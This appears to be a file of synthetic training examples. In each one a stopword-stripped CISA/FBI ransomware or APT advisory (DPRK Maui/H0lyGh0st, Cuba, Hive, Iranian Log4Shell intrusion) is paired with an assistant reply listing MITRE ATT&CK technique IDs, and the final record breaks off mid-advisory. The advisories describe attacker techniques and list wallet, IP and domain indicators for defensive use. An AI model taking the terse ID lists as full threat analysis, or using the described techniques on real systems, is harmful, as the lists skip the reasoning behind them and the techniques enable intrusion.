{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary note cybersecurity advisory csa part ongoing stopransomware effort publish advisories network defenders detail various ransomware variants various ransomware threat actors stopransomware advisories detail historically recently observed tactics techniques procedures ttps indicators compromise iocs help organizations protect ransomware visit stopransomwaregov see stopransomware advisories learn ransomware threats nocost resources united states national security agency nsa us federal bureau investigation fbi us cybersecurity infrastructure security agency cisa us department health human services hhs republic korea rok national intelligence service nis rok defense security agency dsa hereafter referred authoring agencies issuing joint cybersecurity advisory csa highlight ongoing ransomware activity healthcare public health sector organizations critical infrastructure sector entities csa provides overview democratic peoples republic korea dprk statesponsored ransomware updates july 6 2022 joint csa north korean statesponsored cyber actors use maui ransomware target healthcare public health sector advisory highlights ttps iocs dprk cyber actors used gain access conduct ransomware attacks healthcare public health hph sector organizations critical infrastructure sector entities well dprk cyber actors use cryptocurrency demand ransoms authoring agencies assess unspecified amount revenue cryptocurrency operations supports dprk nationallevel priorities objectives including cyber operations targeting united states south korea governmentsspecific targets include department defense information networks defense industrial base member networks iocs product useful sectors previously targeted dprk cyber operations eg us government department defense defense industrial base authoring agencies highly discourage paying ransoms guarantee files records recovered may pose sanctions risks additional information statesponsored dprk malicious cyber activity see cisas north korea cyber threat overview advisories webpage download pdf version report pdf 661 kb downloadable copy iocs see aa23040a stix xml xml 19624 kb technical details note advisory uses mitre attck enterprise framework version 12 see mitre attck enterprise referenced tactics techniques csa supplementary previous reports malicious cyber actor activities involving dprk ransomware campaignsnamely maui h0lygh0st ransomware authoring agencies issuing advisory highlight additional observed ttps dprk cyber actors using conduct ransomware attacks targeting south korean us healthcare systems observable ttps ttps associated dprk ransomware attacks include traditionally observed ransomware operations additionally ttps span phases acquiring purchasing infrastructure concealing dprk affiliation acquire infrastructure dprk actors generate domains personas accounts identify cryptocurrency services conduct ransomware operations actors procure infrastructure ip addresses domains cryptocurrency generated illicit cybercrime ransomware cryptocurrency theft obfuscate identity dprk actors purposely obfuscate involvement operating thirdparty foreign affiliate identities use thirdparty foreign intermediaries receive ransom payments purchase vpns vpss dprk cyber actors also use virtual private networks vpns virtual private servers vpss thirdcountry ip addresses appear innocuous locations instead dprk gain access actors use various exploits common vulnerabilities exposures cve gain access escalate privileges networks recently observed cves actors used gain access include remote code execution apache log4j software library known log4shell remote code execution unpatched sonicwall sma 100 appliances observed cves used include cve 202144228 cve202120038 cve202224990 actors also likely spread malicious code trojanized files xpopup open source messenger commonly used employees small medium hospitals south korea actors spread malware leveraging two domains xpopuppekr xpopupcom xpopuppekr registered ip address 1156895128 xpopupcom registered ip address 119205197111 related file names hashes listed table 1 move laterally discovery initial access dprk cyber actors use staged payloads customized malware perform reconnaissance activities upload download additional files executables execute shell commands staged malware also responsible collecting victim information sending remote host controlled actors employ various ransomware tools actors used privately developed ransomware maui h0lygh0st actors also observed using possessing publically available tools encryption bitlocker deadbolt ech0raix gonnacry hidden tear jigsaw lockbit 20 little ransomware nxransomware ryuk yourransom cases dprk actors portrayed ransomware groups revil ransomware group iocs associated maui h0lygh0st ransomware usage please see appendix b demand ransom cryptocurrency dprk cyber actors observed setting ransoms bitcoin actors known communicate victims via proton mail email accounts private companies healthcare sector actors may threaten expose companys proprietary data competitors ransoms paid bitcoin wallet addresses possibly used dprk cyber actors include 1mthbcrbkyethfa16zo9kabt4f9jmjz8rm bc1q80vc4yjgg6umedkut3e9mhehxl4q4dcjjyzh59 1j8spy62o7z2ajqxoupicgnbh5crwkvwjc 16enldhbnmdcev8iqn4vuyzha7ssdyrh76 bc1q3wzxvu8yhs8h7mlkmf7277wyklkah9k4sm9anu bc1q8xyt4jxhw7mgqpwd6qfdjyxgvjeuz57jxrvgk9 1nqiheqyaqawizkpvdsmitbt7dty1lmxgx bc1qxrpevck3pq1yzrx2pq2rkvkvy0jnm56nzjv6pw 14hvkm7ft2rxdbftnkkrc3kgstmgp2a4hk 1kcwfcugnsy3pznx7u1i5nwfzrtth4brbc 16syqxancddiijcuruzecckdbdwdf4vsec 1n6jphhfaymyaoks5xh31z67bvk4ykd9cp lz1vnjfn6mwjpzkcyobvqwabzyxawn135 1kmww6lgdgykbbrsxrfu9kdohz95fe9kqf 1fx4w9rrg4f3uc7gj18gcwgab8xuw8ajy2 bc1qlqgu2l2kms5338zuc95kxavctzyy0v705tpvyc bc1qy6su7vrh7ts5ng2628escmhr98msmzg62ez2sp bc1q8t69gpxsezdcr8w6tfzp3jeptq4tcp2g9d0mwy bc1q9h7yj79sqm4t536q0fdn7n4y2atsvvl22m28ep bc1qj6y72rk039mqpgtcy7mwjd3eum6cx6027ndgmd bc1qcp557vltuu3qc6pk3ld0ayagrxuf2thp3pjzpe bc1ql8wsflrjf9zlusauynzjm83mupq6c9jz9vnqxg bc1qx60ec3nfd5yhsyyxkzkpts54w970yxj84zrdck bc1qunqnjdlvqkjuhtclfp8kzkjpvdz9qnk898xczp bc1q6024d73h48fnhwswhwt3hqz2lzw6x99q0nulm4 bc1qwdvexlyvg3mqvqw7g6l09qup0qew80wjj9jh7x bc1qavrtge4p7dmcrnvhlvuhaarx8rek76wxyk7dgg bc1qagaayd57vr25dlqgk7f00nhz9qepqgnlnt4upu bc1quvnaxnpqlzq3mdhfddh35j7e7ufxh3gpc56hca bc1qu0pvfmtxawm8s99lcjvxapungtsmkvwyvak6cs bc1qg3zlxxhhcvt6hkuhmqml8y9pas76cajcu9ltdl bc1qn7a3g23nzpuytchyyteyhkcse84cnylznl3j32 bc1qhfmqstxp3yp9muvuz29wk77vjtdyrkff4nrxpu bc1qnh8scrvuqvlzmzgw7eesyrmtes9c5m78duetf3 bc1q7qry3lsrphmnw3exs7tkwzpvzjcxs942aq8n0y bc1qcmlcxfsy0zlqhh72jvvc4rh7hvwhx6scp27na0 bc1q498fn0gauj2kkjsg35mlwk2cnxhaqlj7hkh8xy bc1qnz4udqkumjghnm2a3zt0w3ep8fwdcyv3krr3jq bc1qk0saaw7p0wrwla6u7tfjlxrutlgrwnudzx9tyw bc1qyue2pgjk09ps7qvfs559k8kee3jkcw4p4vdp57 bc1q6qfkt06xmrpclht3acmq00p7zyy0ejydu89zwv bc1qmge6a7sp659exnx78zhm9zgrw88n6un0rl9trs bc1qcywkd7zqlwmjy36c46dpf8cq6ts6wgkjx0u7cn mitigations note mitigations align crosssector cybersecurity performance goals cpgs developed cisa us national institute standards technology nist cpgs provide minimum set practices protections cisa nist recommend organizations implement cisa nist based cpgs existing cybersecurity frameworks guidance protect common impactful threats tactics techniques procedures information cpgs including additional recommended baseline protections see cisagovcpg authoring agencies urge hph organizations limit access data authenticating encrypting connections eg using public key infrastructure certificates virtual private network vpn transport layer security tls connections network services internet things iot medical devices electronic health record systemcpg 33 implement principle least privilege using standard user accounts internal systems instead administrative accountscpg 15 grant excessive system administration privileges turn weak unnecessary network device management interfaces telnet ssh winbox http wide area networks wans secure strong passwords encryption enabled protect stored data masking permanent account number pan displayed rendering unreadable storedthrough cryptography example secure collection storage processing practices personally identifiable information piiprotected health information phi per regulations health insurance portability accountability act 1996 hipaa implementing hipaa security measures could prevent introduction malware systemcpg 34 secure pii phi collection points encrypt data rest transit using technologies tls store personal patient data internal systems protected firewalls ensure extensive backups available create regularly review internal policies regulate collection storage access monitoring piiphi implement enforce multilayer network segmentation critical communications data resting secure reliable layercpg 81 use monitoring tools observe whether iot devices behaving erratically due compromisecpg 31 addition authoring agencies urge organizations including hph sector organizations apply following recommendations prepare mitigate ransomware incidents maintain isolated backups data regularly test backup restorationcpg 73 practices safeguard organizations continuity operations least minimize potential downtime ransomware incident protect data losses ensure backup data encrypted immutable ie altered deleted covers entire organizations data infrastructure create maintain exercise basic cyber incident response plan associated communications plan includes response procedures ransomware incidentcpg 71 72 organizations also ensure incident response communications plans include data breach incidents response notification procedures ensure notification procedures adhere applicable laws see cisamultistate information sharing analysis center msisac joint ransomware guide cisa fact sheet protecting sensitive personal information ransomwarecaused data breaches information creating ransomware response checklist planning responding ransomwarecaused data breaches install updates operating systems software firmware soon releasedcpg 51 timely patching one efficient costeffective steps organization take minimize exposure cybersecurity threats regularly check software updates endoflife notifications prioritize patching known exploited vulnerabilities consider leveraging centralized patch management system automate expedite process use remote desktop protocol rdp potentially risky services secure monitor closelycpg 54 limit access resources internal networks especially restricting rdp using virtual desktop infrastructure assessing risks rdp deemed operationally necessary restrict originating sources require phishingresistant multifactor authentication mfa mitigate credential theft reusecpg 13 rdp must available externally use vpn virtual desktop infrastructure means authenticate secure connection allowing rdp connect internal devices monitor remote accessrdp logs enforce account lockouts specified number attempts block brute force campaigns log rdp login attempts disable unused remote accessrdp portscpg 11 31 ensure devices properly configured security features enabled disable ports protocols use business purpose eg rdp transmission control protocol port 3389 restrict server message block smb protocol within network access necessary servers remove disable outdated versions smb ie smb version 1 threat actors use smb propagate malware across organizations review security posture thirdparty vendors interconnected organization ensure connections thirdparty vendors outside software hardware monitored reviewed suspicious activitycpg 56 62 implement application control policies allow systems execute known permitted programscpg 21 open document readers protected viewing modes help prevent active content running implement user training program phishing exercisescpg 43 raise awareness among users risks visiting websites clicking links opening attachments reinforce appropriate user response phishing spearphishing emails require phishingresistant mfa many services possiblecpg 13particularly webmail vpns accounts access critical systems privileged accounts manage backups use strong passwordscpg 14 avoid reusing passwords multiple accounts see cisa tip choosing protecting passwords national institute standards technology nist special publication 80063b digital identity guidelines information require administrator credentials install softwarecpg 15 audit user accounts administrative elevated privilegescpg 15 configure access controls least privilege mind install regularly update antivirus antimalware software hosts use secure networks consider installing using vpn consider adding email banner messages coming outside organizationscpg 83 indicating higher risk messages consider participating cisas nocost automated indicator sharing ais program receive realtime exchange machinereadable cyber threat indicators defensive measures ransomware incident occurs organization follow organizations ransomware response checklist scan backups possible scan backup data antivirus program check free malware performed using isolated trusted system avoid exposing backups potential compromise us organizations follow notification requirements outlined cyber incident response plan report incidents appropriate authorities us would include fbi local fbi field office cisa cisagovreport us secret service usss usss field office south korean organizations please report incidents nis kisa korea internet security agency knpa korean national police agency nis national intelligence service telephone 111 httpswwwnisgokr kisa korea internet security agency telephone 118 consult service httpswwwbohoorkrconsultransomwaredo knpa korean national police agency electronic cybercrime report management system httpsecrmpolicegokrminwonmain apply incident response best practices found joint cybersecurity advisory technical approaches uncovering remediating malicious activity developed cisa cybersecurity authorities australia canada new zealand united kingdom resources stairwell provided yara rule identify maui ransomware proof concept public rsa key extractor following linkhttpswwwstairwellcomnewsthreatresearchreportmauiransomware request information fbi seeking information shared include boundary logs showing communication foreign ip addresses bitcoin wallet information decryptor file andor benign samples encrypted files stated authoring agencies discourage paying ransoms payment guarantee files recovered may embolden adversaries target additional organizations encourage criminal actors engage distribution ransomware andor fund illicit activities however agencies understand victims faced inability function options evaluated protect shareholders employees customers regardless whether organization decide pay ransom authoring agencies urge promptly report ransomware incidents using contact information acknowledgements nsa fbi cisa hhs would like thank rok nis dsa contributions csa disclaimer endorsement information opinions contained document provided without warranties guarantees reference herein specific commercial products process service trade name trademark manufacturer otherwise constitute imply endorsement recommendation favoring united states government guidance shall used advertising product endorsement purposes trademark recognition microsoft threat intelligence center registered trademark microsoft corporation apache sonicwall apache log4j trademarks apache software foundation terramaster operating system registered trademark octagon systems purpose document developed furtherance authors cybersecurity missions including responsibilities identify disseminate threats develop issue cybersecurity specifications mitigations information may shared broadly reach appropriate stakeholders appendix cve details appendix b indicators compromise iocs ioc section includes hashes ip addresses maui h0lygh0st ransomware variantsas well custom malware implants assumedly developed dprk cyber actors remote access trojans rats loaders toolsthat enable subsequent deployment ransomware additional maui iocs see joint csa north korean statesponsored cyber actors use maui ransomware target healthcare public health sector table 2 lists md5 sha256 hashes associated malware implants rats tools used dprk cyber actors including tools drop maui ransomware files table 3 lists md5 sha256 hashes associated maui ransomware files table 4 lists md5 sha256 hashes associated h0lygh0st ransomware files microsoft blog post h0lygh0st contact information nsa client requirements general cybersecurity inquiries cybersecurityreportsnsagovdefense industrial base inquiries cybersecurity services dibdefensecybernsagovto report incidents anomalous activity related information found joint cybersecurity advisory contact cisas 247 operations center saycisacisadhsgov 1844saycisa 18447292472 local fbi field office wwwfbigovcontactusfield available please include following information regarding incident date time location incident type activity number people affected type equipment used activity name submitting company organization designated point contact media inquiries press desk nsa media relations 4436340721 mediarelationsnsagov cisa media relations 7032352010 cisamediacisadhsgov product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1021, T1083, T1133, T1190, T1486, T1583, T1583.003"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary actions take today mitigate cyber threats ransomware prioritize remediating known exploited vulnerabilities train users recognize report phishing attempts enable enforce phishingresistant multifactor authentication note joint cybersecurity advisory csa part ongoing stopransomware effort publish advisories network defenders detail various ransomware variants ransomware threat actors stopransomware advisories include recently historically observed tactics techniques procedures ttps indicators compromise iocs help organizations protect ransomware visitstopransomwaregov see stopransomware advisories learn ransomware threats nocost resources fbi cybersecurity infrastructure security agency cisa releasing joint csa disseminate known cuba ransomware iocs ttps associated cuba ransomware actors identified fbi investigations thirdparty reporting opensource reporting advisory updates december 2021fbi flash indicators compromise associated cuba ransomware note ransomware known industry cuba ransomware indication cuba ransomware actors connection affiliation republic cuba since release december 2021 fbi flash number us entities compromised cuba ransomware doubled ransoms demanded paid increase year cuba ransomware actors added ttps thirdparty opensource reports identified possible link cuba ransomware actors romcom remote access trojan rat actors industrial spy ransomware actors fbi cisa encourage organizations implement recommendations mitigations section csa reduce likelihood impact cuba ransomware ransomware operations download pdf version report pdf 649 kb downloadable copy iocs see aa22335astix stix 148 kb updated december 12 2022 aa22335a2stix stix 67 kb end update technical details overview since december 2021 release fbi flash indicators compromise associated cuba ransomware fbi observed cuba ransomware actors continuing target us entities following five critical infrastructure sectors financial services government facilities healthcare public health critical manufacturing information technology august 2022 fbi identified cuba ransomware actors compromised 101 entities 65 united states 36 outside united states demanded 145 million us dollars usd received 60 million usd ransom payments cuba ransomware actors tactics techniques procedures previously reported fbi cuba ransomware actors leveraged following techniques gain initial access dozens entities multiple critical infrastructure sectors known vulnerabilities commercial software phishing campaigns compromised credentials legitimate remote desktop protocol rdp tools gaining initial access actors distributed cuba ransomware compromised systems hancitora loader known dropping executing stealers remote access trojans rats types ransomware onto victims networks since spring 2022 cuba ransomware actors modified ttps tools interact compromised networks extort payments victims12 cuba ransomware actors exploited known vulnerabilities weaknesses used tools elevate privileges compromised systems according palo alto networks unit 422 cuba ransomware actors exploited cve202224521 windows common log file system clfs driver steal system tokens elevate privileges used powershell script identify target service accounts associated active directory kerberos ticket actors collected cracked kerberos tickets offline via kerberoasting used tool called kerbercache extract cached kerberos tickets hosts local security authority server service lsass memory used tool exploit cve20201472 also known zerologon gain domain administrative privileges tool intrusion attempts reportedly related hancitor qbot according palo alto networks unit 42 cuba ransomware actors use tools evade detection moving laterally compromised environments executing cuba ransomware specifically actors leveraged dropper writes kernel driver file system called apchelpersys targets terminates security products dropper signed however kernel driver signed using certificate found lapsus nvidia leak2 addition deploying ransomware actors used double extortion techniques exfiltrate victim data 1 demand ransom payment decrypt 2 threaten publicly release ransom payment made2 cuba ransomware link romcom industrial spy marketplace since spring 2022 thirdparty opensource reports identified apparent link cuba ransomware actors romcom rat actors industrial spy ransomware actors according palo alto networks unit 42 cuba ransomware actors began using romcom malware custom rat command control c22 cuba ransomware actors may also leveraging industrial spy ransomware according thirdparty reporting suspected cuba ransomware actors compromised foreign healthcare company threat actors deployed industrial spy ransomware shares distinct similarities configuration cuba ransomware deploying ransomware actors moved laterally using impacket deployed romcom rat meterpreter reverse shell httphttps proxy via c2 server cuba ransomware actors initially used leak site sell stolen data however around may 2022 actors began selling data industrial spys online market selling stolen data2 romcom actors targeted foreign military organizations companies food brokers manufacturers34 actors copied legitimate html code publicfacing webpages modified code incorporated spoofed domains allowed romcom actors host counterfeit trojanized applications solarwinds network performance monitor npm keepass password manager pdf reader pro pdf technologies inc adobe acrobat reader product advanced ip scanner software deploy romcom rat final stage indicators compromise see tables 1 5 cuba ransomware iocs fbi obtained threat response investigations late august 2022 addition tables see publications references section aid detecting possible exploitation compromise note iocs early november 2021 see fbi flash indicators compromise associated cuba ransomware see figure 1 example cuba ransomware note additional resources detect possible exploitation compromise palo alto networks novel news cuba ransomware greetings tropical scorpius blackberry blogromcom threat actor abuses keepass solarwinds target ukraine potentially united kingdom blackberry blogunattributed romcom threat actor spoofing popular apps hits ukrainian militaries mitre attck techniques cuba ransomware actors use attck techniques listed table 6 note details ttps listed table see fbi flash indicators compromise associated cuba ransomware mitigations fbi cisa recommend network defenders apply following mitigations limit potential adversarial use common system network discovery techniques reduce risk compromise cuba ransomware implement recovery plan maintain retain multiple copies sensitive proprietary data servers physically separate segmented secure location ie hard drive storage device cloud require accounts password logins eg service account admin accounts domain admin accounts comply national institute standards technology nist standards developing managing password policies use longer passwords consisting least 8 characters 64 characters length store passwords hashed format using industryrecognized password managers add password user salts shared login credentials avoid reusing passwords implement multiple failed login attempt account lockouts disable password hints refrain requiring password changes frequently per year note nist guidance suggests favoring longer passwords instead requiring regular frequent password resets frequent password resets likely result users developing password patterns cyber criminals easily decipher require administrator credentials install software require multifactor authentication services extent possible particularly webmail virtual private networks accounts access critical systems keep operating systems software firmware date timely patching one efficient costeffective steps organization take minimize exposure cybersecurity threats prioritize patching sonicwall firewall vulnerabilities known exploited vulnerabilities internetfacing systems note sonicwall maintains vulnerability list includes advisory id cve mitigation list found psirtglobalsonicwallcomvulnlist segment networks prevent spread ransomware network segmentation help prevent spread ransomware controlling traffic flows betweenand access tovarious subnetworks restricting adversary lateral movement identify detect investigate abnormal activity potential traversal indicated ransomware networking monitoring tool aid detecting ransomware implement tool logs reports network traffic including lateral movement activity network endpoint detection response edr tools particularly useful detecting lateral connections insight common uncommon network connections host install regularly update enable real time detection antivirus software hosts review domain controllers servers workstations active directories new andor unrecognized accounts audit user accounts administrative privileges configure access controls according principle least privilege disable unused ports consider adding email banner emails received outside organization disable hyperlinks received emails implement timebased access accounts set admin level higher example justintime jit access method provisions privileged access needed support enforcement principle least privilege well zero trust model jit sets networkwide policy place automatically disable admin accounts active directory level account direct need individual users may submit requests automated process grants access specified system set timeframe need support completion certain task disable commandline scripting activities permissions privilege escalation lateral movement often depend software utilities running command line threat actors able run tools difficulty escalating privileges andor moving laterally maintain offline backups data regularly maintain backup restoration instituting practice organization ensures severely interrupted andor irretrievable data ensure backup data encrypted immutable ie altered deleted covers entire organizations data infrastructure resources stopransomwaregov wholeofgovernment approach gives one central location ransomware resources alerts resource mitigate ransomware attack cisamultistate information sharing analysis center msisac joint ransomware guide nocost cyber hygiene services cyber hygiene services ransomware readiness assessment reporting fbi seeking information shared include boundary logs showing communication foreign ip addresses sample ransom note communications ransomware actors bitcoin wallet information decryptor files andor benign sample encrypted file fbi cisa encourage paying ransom payment guarantee victim files recovered furthermore payment may also embolden adversaries target additional organizations encourage criminal actors engage distribution ransomware andor fund illicit activities regardless whether organization decided pay ransom fbi cisa urge promptly report ransomware incidents immediately report local fbi field office cisa uscertcisagovreport disclaimer information report provided informational purposes fbi cisa endorse commercial product service including subjects analysis reference specific commercial products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring fbi cisa acknowledgements fbi cisa would like thank blackberry eset national cyberforensics training alliance ncfta palo alto networks prodaft contributions csa references1 palo alto networks tropical scorpius2 palo alto networks novel news cuba ransomware greetings tropical scorpius3 blackberry unattributed romcom threat actor spoofing popular apps hits ukrainian militaries4 blackberry romcom threat actor abuses keepass solarwinds target ukraine potentially united kingdom revisions december 1 2022 initial versiondecember 12 2022 added new ip addresses iocs product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1003.001, T1059.001, T1068, T1072, T1078, T1090, T1133, T1190, T1558.003, T1562.001, T1563.002, T1566"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: actions take today mitigate cyber threats ransomware prioritize remediating known exploited vulnerabilities enable enforce multifactor authentication strong passwords close unused ports remove application deemed necessary daytoday operations summary note joint cybersecurity advisory csa part ongoing stopransomware effort publish advisories network defenders detail various ransomware variants ransomware threat actors stopransomware advisories include recently historically observed tactics techniques procedures ttps indicators compromise iocs help organizations protect ransomware visit stopransomwaregov see stopransomware advisories learn ransomware threats nocost resources federal bureau investigation fbi cybersecurity infrastructure security agency cisa department health human services hhs releasing joint csa disseminate known hive iocs ttps identified fbi investigations recently november 2022 fbi cisa hhs encourage organizations implement recommendations mitigations section csa reduce likelihood impact ransomware incidents victims ransomware operations report incident local fbi field office cisa download pdf version reportpdf 8529 kb downloadable copy iocs see aa22321astix stix 436 kb technical details note advisory uses mitre attck enterprise framework version 12 see mitre attck enterprise referenced tactics techniques november 2022 hive ransomware actors victimized 1300 companies worldwide receiving approximately us100 million ransom payments according fbi information hive ransomware follows ransomwareasaservice raas model developers create maintain update malware affiliates conduct ransomware attacks june 2021 least november 2022 threat actors used hive ransomware target wide range businesses critical infrastructure sectors including government facilities communications critical manufacturing information technology especially healthcare public health hph method initial intrusion depend affiliate targets network hive actors gained initial access victim networks using single factor logins via remote desktop protocol rdp virtual private networks vpns remote network connection protocols cases hive actors bypassed multifactor authentication mfa gained access fortios servers exploiting common vulnerabilities exposures cve cve202012812 vulnerability enables malicious cyber actor log without prompt users second authentication factor fortitoken actor changes case username hive actors also gained initial access victim networks distributing phishing emails malicious attachments exploiting following vulnerabilities microsoft exchange servers cve202131207 microsoft exchange server security feature bypass vulnerability cve202134473 microsoft exchange server remote code execution vulnerability cve202134523 microsoft exchange server privilege escalation vulnerability gaining access hive ransomware attempts evade detention executing processes identify processes related backups antivirusantispyware file copying terminating processes facilitate file encryption stop volume shadow copy services remove existing shadow copies via vssadmin command line via powershell delete windows event logs specifically system security application logs prior encryption hive ransomware removes virus definitions disables portions windows defender common antivirus programs system registry hive actors exfiltrate data likely using combination rclone cloud storage service meganz addition capabilities microsoft windows operating system hive ransomware known variants linux vmware esxi freebsd encryption process file named key previously key created root directory c root required decryption key file exists machine created reproduced ransom note howtodecrypttxt dropped affected directory states key file modified renamed deleted otherwise encrypted files recovered ransom note contains sales department onion link accessible tor browser enabling victim organizations contact actors live chat panel discuss payment files however victims reported receiving phone calls emails hive actors directly discuss payment ransom note also threatens victims public disclosure leak site accessible tor site hiveleaks contains data exfiltrated victim organizations pay ransom demand see figure 1 additionally hive actors used anonymous file sharing sites disclose exfiltrated data see table 1 figure 1 sample hive ransom note victim organization contacts hive actors live chat panel hive actors communicate ransom amount payment deadline hive actors negotiate ransom demands us dollars initial amounts ranging several thousand millions dollars hive actors demand payment bitcoin hive actors known reinfectwith either hive ransomware another ransomware variantthe networks victim organizations restored network without making ransom payment indicators compromise threat actors leveraged following iocs hive ransomware compromises note indicators legitimate applications hive threat actors used aid malicious exploitation fbi cisa hhs recommend removing application deemed necessary daytoday operations see tables 23 iocs obtained fbi threat response investigations recently november 2022 mitre attck techniques see table 4 referenced threat actor tactics techniques listed advisory mitigations fbi cisa hhs recommend organizations particularly hph sector implement following limit potential adversarial use common system network discovery techniques reduce risk compromise hive ransomware verify hive actors longer access network install updates operating systems software firmware soon releasedprioritize patchingvpn servers remote access software virtual machine software known exploited vulnerabilities consider leveraging centralized patch management system automate expedite process require phishingresistant mfa many services possibleparticularly webmail vpns accounts access critical systems privileged accounts manage backups used secure monitor rdp limit access resources internal networks especially restricting rdp using virtual desktop infrastructure assessing risks deem rdp operationally necessary restrict originating sources require mfa mitigate credential theft reuse rdp must available externally use vpn virtual desktop infrastructure means authenticate secure connection allowing rdp connect internal devices monitor remote accessrdp logs enforce account lockouts specified number attempts block brute force campaigns log rdp login attempts disable unused remote accessrdp ports sure properly configure devices enable security features disable ports protocols used business purposes rdp port 3389tcp maintain offline backups data regularly maintain backup restoration instituting practice organization ensures severely interrupted andor irretrievable data ensure backup data encrypted immutable ie altered deleted covers entire organizations data infrastructure ensure backup data already infected monitor cyber threat reporting regarding publication compromised vpn login credentials change passwordssettings applicable install regularly update antivirus antimalware software hosts enable powershell logging including module logging script block logging transcription install enhanced monitoring tool sysmon microsoft increased logging review following additional resources joint advisory australia canada new zealand united kingdom united states technical approaches uncovering remediating malicious activity provides additional guidance hunting investigating network common mistakes avoid incident handling cybersecurity infrastructure security agencymultistate information sharing analysis center joint ransomware guide covers additional best practices ways prevent protect respond ransomware attack stopransomwaregov us governments official onestop location resources tackle ransomware effectively organization impacted ransomware incident fbi cisa hhs recommend following actions isolate infected system remove infected system networks disable computers wireless bluetooth potential networking capabilities ensure shared networked drives disconnected turn computers devices poweroff segregate ie remove network infected computers poweroff segregate computers devices share network infected computers fully encrypted ransomware possible collect secure infected potentially infected computers devices central location making sure clearly label computers encrypted poweringoff segregating infected computers computers fully encrypted may allow recovery partially encrypted files specialists secure backups ensure backup data offline secure possible scan backup data antivirus program check free malware addition fbi cisa hhs urge organizations apply following recommendations prepare mitigateprevent respond ransomware incidents preparing cyber incidents review security posture thirdparty vendors interconnected organization ensure connections thirdparty vendors outside software hardware monitored reviewed suspicious activity implement listing policies applications remote access allow systems execute known permitted programs established security policy document monitor external remote connections organizations document approved solutions remote management maintenance immediately investigate unapproved solution installed workstation implement recovery plan maintain retain multiple copies sensitive proprietary data servers physically separate segmented secure location ie hard drive storage device cloud identity access management require accounts password logins eg service account admin accounts domain admin accounts comply national institute standards technology nist standards developing managing password policies use longer passwords consisting least 8 characters 64 characters length store passwords hashed format using industryrecognized password managers add password user salts shared login credentials avoid reusing passwords implement multiple failed login attempt account lockouts disable password hints refrain requiring password changes frequently per year unless password known suspected compromisednote nist guidance suggests favoring longer passwords instead requiring regular frequent password resets frequent password resets likely result users developing password patterns cyber criminals easily decipher require administrator credentials install software require phishingresistant multifactor authentication services extent possible particularly webmail virtual private networks accounts access critical systems review domain controllers servers workstations active directories new andor unrecognized accounts audit user accounts administrative privileges configure access controls according principle least privilege implement timebased access accounts set admin level higher example justintime jit access method provisions privileged access needed support enforcement principle least privilege well zero trust model process networkwide policy set place automatically disable admin accounts active directory level account direct need individual users may submit requests automated process grants access specified system set timeframe need support completion certain task protective controls architecture segment networks prevent spread ransomware network segmentation help prevent spread ransomware controlling traffic flows betweenand access tovarious subnetworks restricting adversary lateral movement identify detect investigate abnormal activity potential traversal indicated ransomware networking monitoring tool aid detecting ransomware implement tool logs reports network traffic including lateral movement activity network endpoint detection response edr tools particularly useful detecting lateral connections insight common uncommon network connections host install regularly update enable real time detection antivirus software hosts vulnerability configuration management consider adding email banner emails received outside organization disable commandline scripting activities permissions privilege escalation lateral movement often depend software utilities running command line threat actors able run tools difficulty escalating privileges andor moving laterally ensure devices properly configured security features enabled restrict server message block smb protocol within network access necessary servers remove disable outdated versions smb ie smb version 1 threat actors use smb propagate malware across organizations references stopransomwaregov wholeofgovernment approach gives one central location ransomware resources alerts resource mitigate ransomware attack cisamultistate information sharing analysis center msisac joint ransomware guide nocost cyber hygiene services cyber hygiene services ransomware readiness assessment information requested fbi cisa hhs encourage paying ransom criminal actors paying ransom may embolden adversaries target additional organizations encourage criminal actors engage distribution ransomware andor fund illicit activities paying ransom also guarantee victims files recovered however fbi cisa hhs understand businesses faced inability function executives evaluate options protect shareholders employees customers regardless whether organization decide pay ransom fbi cisa hhs urge promptly report ransomware incidents local fbi field office cisa reportcisagov 1844saycisa 18447292472 provides investigators critical information need track ransomware attackers hold accountable us law prevent future attacks fbi may seek following information determine legally share including recovered executable files live random access memory ram capture images infected systems malware samples ip addresses identified malicious suspicious email addresses attackers copy ransom note ransom amount bitcoin wallets used attackers bitcoin wallets used pay ransom postincident forensic reports disclaimer information report provided informational purposes fbi cisa hhs endorse commercial product service including subjects analysis reference specific commercial products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring fbi cisa hhs revisions initial version november 17 2022 product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1059, T1070, T1112, T1133, T1190, T1486, T1490, T1537, T1562, T1566.001"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary midjune midjuly 2022 cisa conducted incident response engagement federal civilian executive branch fceb organization cisa observed suspected advanced persistent threat apt activity course incident response activities cisa determined cyber threat actors exploited log4shell vulnerability unpatched vmware horizon server installed xmrig crypto mining software moved laterally domain controller dc compromised credentials implanted ngrok reverse proxies several hosts maintain persistence cisa federal bureau investigation fbi assess fceb network compromised iranian governmentsponsored apt actors cisa fbi releasing cybersecurity advisory csa providing suspected iranian governmentsponsored actors tactics techniques procedures ttps indicators compromise iocs help network defenders detect protect related compromises cisa fbi encourage organizations affected vmware systems immediately apply available patches workarounds assume compromise initiate threat hunting activities suspected initial access compromise detected based iocs ttps described csa cisa fbi encourage organizations assume lateral movement threat actors investigate connected systems including dc audit privileged accounts organizations regardless identified evidence compromise apply recommendations mitigations section csa protect similar malicious cyber activity information iranian governmentsponsored iranian malicious cyber activity see cisas iran cyber threat overview advisories webpage fbis iran threats webpage download pdf version report pdf 528 kb downloadable copy malware analysis report mar accompanying report see mar 103870611v1 downloadable copy iocs see aa22320astix 155 mb technical details note advisory uses mitre attck enterprise framework version 11 see mitre attck tactics techniques section table threat actors activity mapped mitre attck tactics techniques corresponding mitigation andor detection recommendations overview april 2022 cisa conducted retrospective analysis using einsteinan fcebwide intrusion detection system ids operated monitored cisaand identified suspected apt activity fceb organizations network cisa observed bidirectional traffic network known malicious ip address associated 